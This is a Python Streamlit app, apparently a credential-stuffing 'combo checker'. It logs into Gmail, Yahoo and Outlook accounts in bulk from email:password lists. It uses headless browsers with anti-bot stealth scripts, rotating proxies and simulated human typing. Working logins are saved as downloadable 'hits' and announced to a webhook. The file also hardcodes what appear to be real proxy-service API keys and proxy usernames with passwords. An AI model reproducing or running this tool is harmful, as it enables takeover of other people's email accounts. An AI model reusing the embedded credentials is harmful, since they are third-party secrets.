import streamlit as st
import threading
import subprocess
import os
import re
import time
import json
import random
import requests
import concurrent.futures
import hashlib
from datetime import datetime
from urllib.parse import urlparse, parse_qs, unquote

# --- GLOBAL THREAD GUARD & THREAD-SAFE STORAGE ---
worker_running = False
global_logs = []
global_successful_accounts = []
global_live_sessions = {}
global_filtered_disposable = []

@st.cache_resource(show_spinner="Initializing Playwright browser...")
def install_playwright():
    subprocess.run(["playwright", "install", "chromium"], check=True)

try:
    install_playwright()
except Exception as e:
    st.error(f"Failed to install Playwright browser: {e}")

# --- Page Configuration ---
st.set_page_config(
    page_title="Mega Ultimate Public Email Checker",
    page_icon="⚡",
    layout="wide",
)

# --- Custom CSS for Layout & Polish ---
st.markdown("""
<style>
    .stSlider input[type=range] {
        accent-color: #ff4b4b;
        cursor: pointer;
    }
    .help-box {
        background-color: #1e1e2f;
        border-left: 3px solid #ff4b4b;
        padding: 8px 12px;
        margin: 4px 0 10px 0;
        font-size: 0.85rem;
        color: #d1d5db;
        border-radius: 4px;
    }
    .metric-card {
        background-color: #161b22;
        border: 1px solid #30363d;
        padding: 15px;
        border-radius: 6px;
    }
</style>
""", unsafe_allow_html=True)

# --- Thread Locks & Persistent Storage ---
cache_lock = threading.Lock()
proxy_lock = threading.Lock()
results_lock = threading.Lock()
bad_proxies = set()

SESSION_DIR = "sessions"
RESULTS_DIR = "mail_results"
DEBUG_DIR = "browser_debug"
for d in [SESSION_DIR, RESULTS_DIR, DEBUG_DIR]:
    os.makedirs(d, exist_ok=True)

PROXY_META_FILE = "proxy_meta.json"
PROXY_FILE = "proxies.txt"

def load_json(path, default=None):
    if default is None:
        default = {}
    if os.path.exists(path):
        try:
            with open(path, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return default
    return default

proxy_meta = load_json(PROXY_META_FILE, {})

def save_proxy_meta():
    try:
        with proxy_lock:
            with open(PROXY_META_FILE, "w", encoding="utf-8") as f:
                json.dump(proxy_meta, f, indent=2)
    except Exception:
        pass

# --- Disposable Domain Blocklist ---
DISPOSABLE_DOMAINS = {
    "mailinator.com", "tempmail.com", "10minutemail.com", "guerrillamail.com",
    "throwawaymail.com", "yopmail.com", "trashmail.com", "getairmail.com",
    "sharklasers.com", "dispostable.com", "maildrop.cc", "getnada.com",
    "mohmal.com", "fakemailgenerator.com", "temp-mail.org"
}

def is_disposable_email(email):
    try:
        domain = email.split("@")[1].lower()
        return domain in DISPOSABLE_DOMAINS
    except Exception:
        return False

DEVICE_PROFILES = [
    {
        "name": "Windows Desktop Chrome",
        "viewport": {"width": 1920, "height": 1080},
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    },
    {
        "name": "MacBook Pro Safari",
        "viewport": {"width": 1440, "height": 900},
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
    }
]

STEALTH_JS = """
Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
try { window.PublicKeyCredential = undefined; } catch(e) {}
window.chrome = window.chrome || { runtime: {} };
"""

# --- Initialize Session States ---
if "LIVE_SESSIONS" not in st.session_state:
    st.session_state.LIVE_SESSIONS = {}
if "SUCCESSFUL_ACCOUNTS" not in st.session_state:
    st.session_state.SUCCESSFUL_ACCOUNTS = []
if "filtered_disposable" not in st.session_state:
    st.session_state.filtered_disposable = []
if "fetched_proxies" not in st.session_state:
    st.session_state.fetched_proxies = ""
if "engine_logs" not in st.session_state:
    st.session_state.engine_logs = []
if "proxy_stats" not in st.session_state:
    st.session_state.proxy_stats = {"total": 0, "alive": 0, "dead": 0, "countries": {}}
if "help_states" not in st.session_state:
    st.session_state.help_states = {}

def sync_globals_to_session():
    with results_lock:
        st.session_state.engine_logs = list(global_logs)
        st.session_state.SUCCESSFUL_ACCOUNTS = list(global_successful_accounts)
        st.session_state.LIVE_SESSIONS = dict(global_live_sessions)
        st.session_state.filtered_disposable = list(global_filtered_disposable)

def log_action(message):
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = f"[{timestamp}] 🖱️ ACTION: {message}"
    with results_lock:
        global_logs.append(log_entry)
    sync_globals_to_session()

def instant_help(key_name, description_text, label_text, widget_type="label", **kwargs):
    if key_name not in st.session_state.help_states:
        st.session_state.help_states[key_name] = {"visible": False, "time": 0}
    
    state_data = st.session_state.help_states[key_name]
    if state_data.get("visible", False):
        if time.time() - state_data.get("time", 0) > 10.0:
            st.session_state.help_states[key_name]["visible"] = False

    col_lbl, col_btn = st.sidebar.columns([0.85, 0.15])
    with col_lbl:
        if widget_type == "label":
            st.markdown(f"**{label_text}**")
        elif widget_type == "checkbox":
            val = st.checkbox(label_text, value=kwargs.get("value", False), key=f"chk_{key_name}")
        elif widget_type in ("text", "selectbox"):
            st.markdown(f"**{label_text}**")

    with col_btn:
        if st.button("❓", key=f"help_btn_{key_name}", help="Toggle help description"):
            current = st.session_state.help_states[key_name]["visible"]
            st.session_state.help_states[key_name] = {"visible": not current, "time": time.time()}
            st.rerun()

    if st.session_state.help_states[key_name]["visible"]:
        st.sidebar.markdown(f"<div class='help-box'>💡 {description_text}</div>", unsafe_allow_html=True)

    if widget_type == "checkbox":
        return val
    return None

# ==========================================
# EXCLUSIVE PROXY POOL & WEBSHARE INTEGRATION
# ==========================================
WEBSHARE_KEYS = [
    "ty1wj93kaw0k1ab7vv05lqvga86zs6tu2ngqjkyo",   
    "z6rhxx6390l1kitf5zjptukkjbjielb56mwqr741",  
    "a0afl99r624zz7fs8fh5y1ck5f9a0me3kajz5xtn",
    "5gtgl0pheucjczwxjjwzh1u7edgs65dp4cyfbcl3",
    "dqibfb8n2kkp7w0sku8gielshqqv4lcq6vuzdltb",
    "mpb64af9rak5931lfvmoozs9hsepeovj59ggrufz",
    "0hnwlw0e590d0yo9odtr411p4rw85uqv3oenc0ej",
    "3enappszm6k7p4tm5czf9as9d3g95jgasbuuvcr8",
    "myyibaqdn66o8pavn4kti90x2ametb9117zdwyi3",
]

OXYLABS_PROXIES = [
    "user-Positive_S79mq-country-US:Kingfrosh5252+@dc.oxylabs.io:8000",         
    "user-Positivekenny_ls8CB-country-US:Adejoke52_52@dc.oxylabs.io:8000",       
]

PROXY_TEST_TIMEOUT = 5
MAX_TEST_WORKERS = 12

def parse_proxy_for_playwright(proxy_str):
    try:
        proxy_str = (proxy_str or "").strip()
        if not proxy_str:
            return None
        if "@" in proxy_str and "://" not in proxy_str:
            cred, host = proxy_str.rsplit("@", 1)
            u, pw = cred.split(":", 1)
            h, port = host.split(":")
            return {"server": f"http://{h}:{port}", "username": u, "password": pw}
        parts = proxy_str.split(":")
        if len(parts) == 4:
            return {"server": f"http://{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]}
        elif len(parts) == 2:
            return {"server": f"http://{parts[0]}:{parts[1]}"}
        return None
    except Exception:
        return None

def compute_real_score(success_count, fail_count, initial_latency_score=80):
    total = success_count + fail_count
    if total == 0:
        return initial_latency_score
    smoothed_success = success_count + 2
    smoothed_fail = fail_count + 1
    smoothed_total = smoothed_success + smoothed_fail
    success_rate = (smoothed_success / smoothed_total) * 100
    score = int(success_rate - (fail_count * 5))
    return max(0, min(100, score))

def test_one(proxy_str):
    proxy_formatted = proxy_str if "@" in proxy_str else f"http://{proxy_str}"
    start = time.time()
    try:
        r = requests.get("https://api.ipify.org?format=json", proxies={"http": proxy_formatted, "https": proxy_formatted}, timeout=PROXY_TEST_TIMEOUT)
        if r.status_code != 200:
            with proxy_lock:
                if proxy_str not in proxy_meta:
                    proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": "US"}
                proxy_meta[proxy_str]["fails"] = proxy_meta[proxy_str].get("fails", 0) + 1
                proxy_meta[proxy_str]["score"] = 0
            save_proxy_meta()
            return (proxy_str, False, 0, "-", "-")
            
        latency = int((time.time() - start) * 1000)
        country = "US"
        try:
            g = requests.get("http://ip-api.com/json/", proxies={"http": proxy_formatted, "https": proxy_formatted}, timeout=3).json()
            country = g.get("countryCode", "US")
        except Exception:
            pass
            
        initial_score = max(0, min(100, 100 - int(latency / 15)))
        with proxy_lock:
            if proxy_str not in proxy_meta:
                proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": country}
            m = proxy_meta[proxy_str]
            m["success"] = m.get("success", 0) + 1
            m["score"] = compute_real_score(m["success"], m.get("fails", 0), initial_score)
            m["country"] = country
        save_proxy_meta()
        return (proxy_str, True, latency, country, "Unknown")
    except Exception:
        with proxy_lock:
            if proxy_str not in proxy_meta:
                proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": "US"}
            proxy_meta[proxy_str]["fails"] = proxy_meta[proxy_str].get("fails", 0) + 1
            proxy_meta[proxy_str]["score"] = 0
        save_proxy_meta()
        return (proxy_str, False, 0, "-", "-")

def load_webshare(api_key):
    if not api_key.strip():
        return []
    out = []
    url = "https://proxy.webshare.io/api/v2/proxy/list/download/"
    headers = {"Authorization": f"Token {api_key.strip()}"}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            lines = r.text.strip().split("\n")
            for line in lines:
                if line.strip():
                    parts = line.strip().split(":")
                    if len(parts) == 4:
                        ip, port, user, pwd = parts
                        out.append(f"{user}:{pwd}@{ip}:{port}")
        else:
            json_url = "https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page=1&page_size=100"
            r_json = requests.get(json_url, headers=headers, timeout=10)
            if r_json.status_code == 200:
                data = r_json.json()
                for it in data.get("results", []):
                    out.append(f"{it['username']}:{it['password']}@{it['proxy_address']}:{it['port']}")
    except Exception:
        pass
    return out

def get_filtered_active_proxies():
    raw_lines = [p.strip() for p in st.session_state.fetched_proxies.splitlines() if p.strip()]
    filtered = []
    cfg = st.session_state.get("BROWSER_CFG", {})
    min_score = cfg.get("MIN_PROXY_SCORE", 40)
    pool_mode = cfg.get("POOL_MODE", "us_only")
    target_country = cfg.get("COUNTRY_CODE", "US")
    mix_countries = cfg.get("MIX_LIST", ["US", "GB", "DE"])

    for p in raw_lines:
        if p in bad_proxies:
            continue
        meta = proxy_meta.get(p, {})
        score = meta.get("score", 50)
        country = meta.get("country", "US").upper()

        if score < min_score:
            continue

        if pool_mode == "us_only":
            if "US" in country or "-country-US" in p:
                filtered.append(p)
        elif pool_mode == "all":
            filtered.append(p)
        elif pool_mode == "country":
            if target_country in country or target_country in p.upper():
                filtered.append(p)
        elif pool_mode == "mix":
            if any(mc in country or mc in p.upper() for mc in mix_countries):
                filtered.append(p)
        else:
            filtered.append(p)

    return filtered if filtered else raw_lines

def send_telegram_alert(message):
    cfg = st.session_state.BROWSER_CFG
    url = cfg.get("WEBHOOK_URL", "").strip()
    if not url:
        return
    try:
        requests.post(url, json={"content": message}, timeout=5)
    except Exception:
        pass

# ==========================================
# ORGANIZED SIDEBAR & CORRECTED EXPANDERS
# ==========================================
st.sidebar.title("🎛️ Engine Control Panel")

with st.sidebar.expander("⚙️ Execution & Thread Settings", expanded=True):
    instant_help("workers", "Initial number of concurrent worker threads spawned to validate incoming accounts.", "Workers Start:")
    workers = st.slider("Workers Slider", min_value=1, max_value=50, value=5, step=1, label_visibility="collapsed")

    instant_help("deadline", "Maximum execution time allotted per validation batch task.", "Deadline (s):")
    deadline = st.slider("Deadline Slider", min_value=5, max_value=120, value=45, step=5, label_visibility="collapsed")

    instant_help("max_acc", "Maximum number of accounts to check in a single live run (0 for unlimited).", "Max Accounts:")
    max_acc = st.slider("Max Accounts Slider", min_value=0, max_value=5000, value=5000, step=100, label_visibility="collapsed")

with st.sidebar.expander("🌐 Proxy Filtering & Pool Modes", expanded=False):
    instant_help("min_proxy_score", "Only proxies with a smart health score greater than or equal to this value will be utilized.", "Min proxy score:")
    min_proxy_score = st.slider("Min proxy score Slider", min_value=0, max_value=100, value=40, step=5, label_visibility="collapsed")

    instant_help("pool_mode", "Defines how proxies are filtered and loaded into active rotation.", "Pool mode:", widget_type="selectbox")
    pool_mode = st.selectbox("Pool mode select", options=["us_only", "all", "country", "mix"], index=0, label_visibility="collapsed")

    instant_help("country_code", "Target country specification code (e.g., US, GB, DE).", "Country code:", widget_type="text")
    country_code = st.text_input("Country code input", value="US", label_visibility="collapsed")

    instant_help("mix_list", "Comma-separated country list for blended regional proxy routing.", "Mix list:", widget_type="text")
    mix_list = st.text_input("Mix list input", value="US,GB,DE", label_visibility="collapsed")

with st.sidebar.expander("🛡️ Behavioral Toggles", expanded=False):
    filter_disposable = st.checkbox("Filter Disposable Emails", value=True, help="Automatically block temp-mails")
    use_proxies = st.checkbox("Enable Proxy Routing", value=True, help="Route traffic through verified proxies")
    stealth_mode = st.checkbox("Enable Stealth Mode", value=True, help="Mask webdriver automation fingerprints")
    retry_cloudflare = st.checkbox("Auto-Retry Cloudflare Challenges", value=True, help="Bypass browser gate challenges")

# --- Configuration State Dictionary ---
DEFAULT_BROWSER_CFG = {
    "BROWSER_TIMEOUT": 45,
    "MAX_ACCOUNTS": max_acc,
    "WORKERS": workers,
    "DEADLINE": deadline,
    "MIN_PROXY_SCORE": min_proxy_score,
    "POOL_MODE": pool_mode,
    "COUNTRY_CODE": country_code.strip().upper(),
    "MIX_LIST": [c.strip().upper() for c in mix_list.split(",") if c.strip()],
    "FILTER_DISPOSABLE": filter_disposable,
    "USE_PROXIES": use_proxies,
    "STEALTH": stealth_mode,
    "FORCE_EN_US": True,
    "RETRY_CLOUDFLARE": retry_cloudflare,
    "WEBHOOK_URL": "",
}

if "BROWSER_CFG" not in st.session_state:
    st.session_state.BROWSER_CFG = DEFAULT_BROWSER_CFG.copy()

if st.sidebar.button("💾 Apply Settings", type="primary", use_container_width=True):
    st.session_state.BROWSER_CFG.update({
        "WORKERS": workers,
        "DEADLINE": deadline,
        "MAX_ACCOUNTS": max_acc,
        "MIN_PROXY_SCORE": min_proxy_score,
        "POOL_MODE": pool_mode,
        "COUNTRY_CODE": country_code.strip().upper(),
        "MIX_LIST": [c.strip().upper() for c in mix_list.split(",") if c.strip()],
        "FILTER_DISPOSABLE": filter_disposable,
        "USE_PROXIES": use_proxies,
        "STEALTH": stealth_mode,
        "RETRY_CLOUDFLARE": retry_cloudflare,
    })
    st.sidebar.success("Settings applied successfully!")

st.sidebar.markdown("---")
col_p1, col_p2 = st.sidebar.columns(2)
with col_p1:
    st.markdown(f"**Loaded:** {len([p for p in st.session_state.fetched_proxies.splitlines() if p.strip()])}")
with col_p2:
    st.markdown(f"**Alive:** {st.session_state.proxy_stats.get('alive', 0)}")

with st.sidebar.expander("➕ Add Custom Proxies", expanded=False):
    custom_proxies_input = st.text_area("Paste proxies (IP:Port:User:Pass)", placeholder="192.168.1.1:8080:user:pass", key="custom_proxies_box")
    if st.button("Append Custom Proxies", use_container_width=True):
        if custom_proxies_input.strip():
            current = st.session_state.fetched_proxies.strip()
            new_combined = (current + "\n" + custom_proxies_input).strip() if current else custom_proxies_input.strip()
            st.session_state.fetched_proxies = new_combined
            st.sidebar.success("Appended custom proxies successfully!")

if st.sidebar.button("🚀 Fetch & Test All Proxies", type="primary", use_container_width=True):
    log_action("Clicked 'Fetch & Test All Proxies'")
    with st.spinner("Scraping Webshare API & Oxylabs list... testing proxy health..."):
        try:
            all_raw = []
            webshare_success_count = 0

            for i, key in enumerate(WEBSHARE_KEYS, 1):
                lst = load_webshare(key)
                if lst:
                    webshare_success_count += len(lst)
                    all_raw.extend(lst)

            for ox in OXYLABS_PROXIES:
                all_raw.append(ox)
            
            all_raw = list(dict.fromkeys(all_raw))
            alive = []
            country_counts = {}
            alive_count, dead_count = 0, 0
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_TEST_WORKERS) as ex:
                futures = {ex.submit(test_one, p): p for p in all_raw}
                for fut in concurrent.futures.as_completed(futures):
                    res = fut.result()
                    if res and res[1]:
                        alive.append(res[0])
                        alive_count += 1
                        country_counts[res[3]] = country_counts.get(res[3], 0) + 1
                    else:
                        dead_count += 1
                        
            st.session_state.fetched_proxies = "\n".join(alive)
            st.session_state.proxy_stats = {"total": len(all_raw), "alive": alive_count, "dead": dead_count, "countries": country_counts}
            
            st.sidebar.success(f"Webshare: {webshare_success_count} | Oxylabs: {len(OXYLABS_PROXIES)} | Alive: {alive_count}")
            st.rerun()
        except Exception as e:
            st.sidebar.error(f"Proxy fetch error: {str(e)}")

# ==========================================
# MULTI-PROVIDER SYNCHRONOUS AUTOMATION ENGINE
# ==========================================
INBOX_MARKERS = (
    "new mail", "inbox", "focused", "deleted items", "junk email",
    "sent items", "drafts", "archive", "unread", "mark as read", "reply",
)

def sticky_idx(email, n):
    return int(hashlib.md5(email.lower().encode()).hexdigest(), 16) % n if n else 0

def human_fill(page, loc, text, typing_ms=80):
    try:
        loc.click(timeout=2000, force=True)
    except Exception:
        pass
    try:
        loc.fill("")
    except Exception:
        pass
    try:
        for ch in text:
            loc.type(ch, delay=random.randint(int(typing_ms * 0.5), int(typing_ms * 1.5)))
        return
    except Exception:
        loc.fill(text)

def click_text(page, labels):
    for t in labels:
        for sel in (
            f"button:has-text('{t}')",
            f"a:has-text('{t}')",
            f"[role='button']:has-text('{t}')",
            f"input[value='{t}']",
            f"span:has-text('{t}')",
        ):
            try:
                loc = page.locator(sel).first
                if loc.count() and loc.is_visible(timeout=400):
                    loc.click(timeout=4000)
                    return t
            except Exception:
                continue
    return None

def is_real_inbox(sc):
    u = (sc.get("url") or "").lower()
    low = sc.get("low") or ""
    text = (sc.get("text") or "").strip()
    if any(x in u for x in ("login.", "oauth", "account.live.com", "signin", "accounts.google", "login.yahoo")):
        return False
    if len(text) < 40 and not sc.get("buttons"):
        return False
    if any(m in low for m in INBOX_MARKERS):
        return True
    return False

def read_screen(page):
    url = page.url or ""
    title, text, buttons = "", "", []
    try:
        title = page.title()
    except Exception:
        pass
    try:
        text = (page.locator("body").inner_text(timeout=3500))[:1200]
    except Exception:
        pass
    try:
        for el in (page.locator("button, a, [role='button'], input[type='submit']").all())[:25]:
            t = ((el.inner_text()) or (el.get_attribute("value") or "")).strip()
            if t and len(t) < 90:
                buttons.append(t)
    except Exception:
        pass
    low = f"{url} {title} {text}".lower()
    return {"url": url, "title": title, "text": text, "buttons": buttons, "low": low}

def execute_login_flow(page, email, password, provider, config):
    domain = email.split("@")[-1].lower()
    
    if "gmail" in domain or "google" in provider.lower():
        login_url = "https://accounts.google.com/"
        email_sel = "input[type='email']"
        pass_sel = "input[type='password']"
    elif "yahoo" in domain or "yahoo" in provider.lower():
        login_url = "https://login.yahoo.com/"
        email_sel = "input[name='username']"
        pass_sel = "input[name='password']"
    else:
        login_url = "https://login.live.com/"
        email_sel = "input[type='email'], input[name='loginfmt']"
        pass_sel = "input[type='password'], input[name='passwd']"

    t0 = time.time()
    try:
        page.goto(login_url, wait_until="domcontentloaded", timeout=30000)
    except Exception as e:
        return "error", f"nav fail: {e}"

    email_done = pass_done = False
    for step in range(15):
        if time.time() - t0 > config.get("DEADLINE", 45):
            return "error", "account timeout"

        sc = read_screen(page)
        if is_real_inbox(sc):
            return "success", "Inbox verified successfully."

        low = sc["low"]
        if any(x in low for x in ("incorrect password", "invalid password", "wrong password")):
            return "wrong_password", "invalid password"

        if not email_done:
            em_loc = page.locator(email_sel).first
            if em_loc.count() and em_loc.is_visible():
                human_fill(page, em_loc, email, config.get("TYPING_MS", 80))
                click_text(page, ["Next", "Sign in", "Continue"])
                email_done = True
                page.wait_for_timeout(2500)
                continue

        if email_done and not pass_done:
            pw_loc = page.locator(pass_sel).first
            if pw_loc.count() and pw_loc.is_visible():
                human_fill(page, pw_loc, password, config.get("TYPING_MS", 80))
                click_text(page, ["Sign in", "Next", "Verify", "Continue"])
                pass_done = True
                page.wait_for_timeout(3000)
                continue

        page.wait_for_timeout(1000)

    return "error", "max steps reached"

def run_checker_engine(accounts_list, provider_override, proxies_pool, config, max_workers):
    global worker_running
    worker_running = True

    try:
        from playwright.sync_api import sync_playwright

        with results_lock:
            global_logs.append(f"Engine launched for {len(accounts_list)} accounts with {max_workers} workers.")
        sync_globals_to_session()

        def worker_thread_task():
            global worker_running
            with sync_playwright() as p:
                browser = p.chromium.launch(
                    headless=True,
                    args=["--disable-blink-features=AutomationControlled", "--no-sandbox", "--disable-dev-shm-usage"]
                )
                
                for line in accounts_list:
                    if not worker_running:
                        break
                    if ":" not in line:
                        continue
                    email, password = line.strip().split(":", 1)
                    email, password = email.strip(), password.strip()

                    if config.get("FILTER_DISPOSABLE", True) and is_disposable_email(email):
                        with results_lock:
                            global_filtered_disposable.append(email)
                        continue

                    device = random.choice(DEVICE_PROFILES)
                    selected_proxy = None
                    proxy_dict = None

                    if config["USE_PROXIES"] and proxies_pool:
                        idx = sticky_idx(email, len(proxies_pool))
                        selected_proxy = proxies_pool[idx]
                        proxy_dict = parse_proxy_for_playwright(selected_proxy)

                    context_args = {
                        "user_agent": device["ua"],
                        "viewport": device["viewport"],
                        "locale": "en-US" if config.get("FORCE_EN_US", True) else "default",
                    }
                    if proxy_dict:
                        context_args["proxy"] = proxy_dict

                    try:
                        context = browser.new_context(**context_args)
                        if config.get("STEALTH", True):
                            context.add_init_script(STEALTH_JS)
                        page = context.new_page()

                        status, detail = execute_login_flow(page, email, password, provider_override, config)

                        timestamp = datetime.now().strftime("%H:%M:%S")
                        with results_lock:
                            if status == "success":
                                msg = f"[{timestamp}] ✅ SUCCESS: {email} verified! [{detail}]"
                                global_logs.append(msg)
                                global_live_sessions[email] = {"status": "Active", "time": timestamp, "proxy": selected_proxy or "Direct", "snippet": detail}
                                hit_entry = f"{email}:{password}"
                                if hit_entry not in global_successful_accounts:
                                    global_successful_accounts.append(hit_entry)
                                send_telegram_alert(f"⚡ HIT SUCCESS: {email} | Proxy: {selected_proxy}")
                            else:
                                global_logs.append(f"[{timestamp}] ❌ {status.upper()}: {email} ({detail})")

                        context.close()
                    except Exception as e:
                        with results_lock:
                            global_logs.append(f"⚠️ Worker Exception for {email}: {str(e)}")

                    sync_globals_to_session()
                    time.sleep(1)

                browser.close()
                worker_running = False
                sync_globals_to_session()

        t = threading.Thread(target=worker_thread_task, daemon=True)
        t.start()
    except Exception as e:
        worker_running = False
        with results_lock:
            global_logs.append(f"🚨 Critical Engine Error: {str(e)}")
        sync_globals_to_session()

# ==========================================
# MAIN INTERFACE TABS
# ==========================================
st.title("⚡ Mega Ultimate Public Email Checker")
st.markdown("Custom URL Slug: `positive-public-email-checker.streamlit.app` — Modular Multi-Provider Engine.")

sync_globals_to_session()

tab_engine, tab_terminal = st.tabs([
    "🚀 Engine Runner", 
    "💻 Terminal Remote"
])

with tab_engine:
    st.subheader("Batch Account & Dynamic Provider Processor")
    
    col_input1, col_input2 = st.columns(2)
    with col_input1:
        st.markdown("### 📝 Paste Combos")
        accounts_pasted = st.text_area(
            "Paste combo format",
            height=140,
            placeholder="account1@outlook.com:Pass123!",
            label_visibility="collapsed"
        )
    with col_input2:
        st.markdown("### 📁 Upload Combo File")
        uploaded_file = st.file_uploader("Upload .txt combo file", type=["txt"], label_visibility="collapsed")
    
    file_accounts = []
    if uploaded_file is not None:
        try:
            content = uploaded_file.getvalue().decode("utf-8", errors="ignore")
            file_accounts = [line.strip() for line in content.splitlines() if line.strip() and ":" in line]
            st.success(f"Loaded {len(file_accounts)} accounts from uploaded file!")
        except Exception as e:
            st.error(f"Error reading file: {e}")

    col_opt1, col_opt2 = st.columns(2)
    with col_opt1:
        email_provider = st.selectbox(
            "Select Provider Mode",
            ["Auto-Detect (Dynamic Router)", "Microsoft (Outlook / Hotmail / Live)", "Google (Gmail)", "Yahoo Mail"],
            key="eng_provider"
        )
    with col_opt2:
        max_threads = st.number_input("Concurrent Threads", min_value=1, max_value=25, value=st.session_state.BROWSER_CFG.get("WORKERS", 5), key="eng_threads")

    proxies_pool = get_filtered_active_proxies()

    c1, c2, c3 = st.columns(3)
    with c1:
        start_engine = st.button("▶️ Launch Checker Engine", type="primary", use_container_width=True)
    with c2:
        stop_engine = st.button("⏹️ Stop / Force Unlock", use_container_width=True)
    with c3:
        if st.button("🧹 Clear Logs & Cache", use_container_width=True):
            log_action("Clicked 'Clear Logs & Cache'")
            with results_lock:
                global_logs.clear()
            sync_globals_to_session()
            st.success("Logs successfully cleared!")
            st.rerun()

    if stop_engine:
        worker_running = False
        st.warning("Engine force-stopped by user.")

    if start_engine:
        pasted_lines = [line.strip() for line in accounts_pasted.splitlines() if line.strip() and ":" in line]
        combined_accounts = list(dict.fromkeys(pasted_lines + file_accounts))
        
        if not combined_accounts:
            st.error("Validation Error: Please paste or upload valid account lines in email:password format.")
        else:
            run_checker_engine(combined_accounts, email_provider, proxies_pool, st.session_state.BROWSER_CFG, max_threads)
            st.success(f"Engine started for {len(combined_accounts)} accounts using pool mode: {st.session_state.BROWSER_CFG.get('POOL_MODE')}!")
            st.rerun()

    if st.session_state.SUCCESSFUL_ACCOUNTS:
        st.markdown("### 📥 Flexible Export Format Options")
        export_data = "\n".join(st.session_state.SUCCESSFUL_ACCOUNTS)
        st.download_button(
            label="💾 Download Working Accounts (TXT)",
            data=export_data,
            file_name=f"successful_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            mime="text/plain",
            use_container_width=True
        )

    st.markdown("### **📊 Live Execution Log Viewer**")
    st.code("\n".join(st.session_state.engine_logs[-40:]), language="text")

    if worker_running:
        time.sleep(1.5)
        st.rerun()

with tab_terminal:
    st.subheader("💻 Terminal Remote & Inbox Reader")
    if not st.session_state.LIVE_SESSIONS:
        st.info("No active sessions captured yet. Execute successful runs via the Engine Runner tab.")
    else:
        active_acc = st.selectbox("Active Account Session", list(st.session_state.LIVE_SESSIONS.keys()))
        session_info = st.session_state.LIVE_SESSIONS[active_acc]
        safe_name = re.sub(r'[^a-zA-z0-9_-]', '_', active_acc)
        
        st.code(f"""
Session Active    : {active_acc}
Storage File Path : sessions/{safe_name}.json
Proxy Tunnel      : {session_info.get('proxy', 'Direct')}
Timestamp         : {session_info.get('time', 'N/A')}
--------------------------------------------------
Latest Snippet / Inbox DOM:
{session_info.get('snippet', 'No snippet captured.')}
        """, language="text")
